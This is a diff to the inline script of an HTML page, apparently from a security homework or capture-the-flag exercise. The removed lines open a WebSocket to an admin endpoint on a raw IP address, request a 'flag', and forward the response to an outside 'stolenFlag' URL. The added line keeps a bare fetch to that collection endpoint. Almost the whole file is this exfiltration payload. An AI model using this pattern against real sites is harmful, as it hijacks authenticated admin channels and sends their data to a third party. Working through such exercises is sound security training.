@@ -5,19 +5,7 @@
     </head>
     <body>
         <script>
-            // Create a new WebSocket with the appropriate URL
-const wsUrl = "ws://91.107.157.58:8080/admin/ws";
-const websocket = new WebSocket(wsUrl);
-
-websocket.onopen = () => {
-  websocket.send("flag");
-
-};
-fetch(`https://hw2p3.ckodser.ir/stolenFlag#itCouldWork`);
-
-websocket.onmessage = (event) => {
-fetch(`https://hw2p3.ckodser.ir/stolenFlag#${event.data}`);
-};
+fetch(`https://hw2p3.ckodser.ir/stolenFlag`);
         </script>
     </body>
 </html>
